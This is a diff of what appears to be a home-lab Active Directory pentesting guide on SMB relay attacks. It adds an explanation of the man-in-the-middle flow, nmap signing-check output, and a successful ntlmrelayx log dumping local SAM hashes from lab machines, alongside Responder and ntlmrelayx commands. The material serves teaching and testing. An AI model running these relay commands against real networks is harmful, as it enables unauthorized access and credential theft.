@@ -6,9 +6,30 @@ SMB (Server Message Block) is a network file-sharing protocol primarily used in 
 
 ### What can go wrong here?
 
-An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.
+**the attacker positions themselves as a man-in-the-middle (MITM) between the client and the target system**
 
-SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process
+- An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.
+
+- With LLMNR/NBT-NS poisoning (Responder), the attacker tricks the client into talking to them instead of the real server. Normally this just lets them capture the NTLM challenge–response.
+
+- With SMB relay, instead of stopping there, the attacker forwards the client’s authentication attempt to a real server. The attacker is now in the middle:
+
+  - Client thinks it’s authenticating to the intended server.
+
+  - Target server thinks it’s authenticating the client.
+
+  - Attacker just passes messages back and forth, never needing to crack the password or hash.
+
+- SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process.
+
+```{figure} ../../../_static/AD/smb-relay.png
+:alt: Sequence Diagram of Relay Attack
+:width: 100%
+:align: center
+
+Relay Attack
+
+```
 
 ### Attack Requirements
 
@@ -20,6 +41,42 @@ SMB signing must be disabled or not enforced on the target system, the relayed u
 
 ```
 nmap --script=smb2-security-mode.nse -p445 <target-ip> -Pn
+```
+
+```
+Nmap scan report for 10.0.2.18
+Host is up (0.0016s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:80:FA:D3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+
+
+Nmap scan report for 10.0.2.17
+Host is up (0.00082s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:92:B4:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+
+
+Nmap scan report for 10.0.2.16
+Host is up (0.00058s latency).
+
+PORT    STATE    SERVICE
+445/tcp filtered microsoft-ds
+MAC Address: 08:00:27:EA:E2:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
 ```
 
 #### Step 2: Setting up the attack
@@ -48,6 +105,17 @@ impacket-ntlmrelayx -tf targets.txt -smb2support -i for shell
 When an event (such as LLMNR poisoning) occurrs, responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets file.
 
 In our lab we simulate an event by pointing to the attacker machine ip `\\10.0.2.15` on THEPUNISHER fcastle machine (fcastle is admin on SPIDERMAN so we can authenticate there and dump the local SAM hashes)
+
+```
+[*] Received connection from MARVEL/fcastle at THEPUNISHER, connection will be relayed after re-authentication
+[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.16 controlled, attacking target smb://10.0.2.17
+[*] Authenticating against smb://10.0.2.17 as MARVEL/FCASTLE SUCCEED
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c7c36b0f2e6cf2201e6ce026fca58d9c:::
+```
 
 The SAM (Security Account Manager) is a database in Windows that stores local user account information, including hashed representations of passwords. When attackers “dump the SAM,” they extract these password hashes to attempt cracking or use them in pass-the-hash attacks.
 
